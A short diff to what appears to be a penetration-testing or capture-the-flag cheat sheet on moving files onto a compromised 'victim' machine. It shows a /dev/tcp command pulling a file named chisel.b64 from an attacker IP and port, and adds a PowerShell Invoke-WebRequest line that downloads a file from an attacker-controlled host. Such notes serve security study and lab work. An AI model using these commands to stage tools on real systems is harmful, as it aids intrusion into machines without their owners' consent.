@@ -20,3 +20,8 @@ From the victim run
 `cat < /dev/tcp/<IP>/<PORT> > <FILENAME>`
 
 `cat < /dev/tcp/10.11.41.83/9001 > chisel.b64`
+
+
+## Powershell
+Within a powershell cli, you can transfer files to your box with 
+`Invoke-WebRequest "http://<IP>/<FILE>" -OutFile "<FILENAME>"`
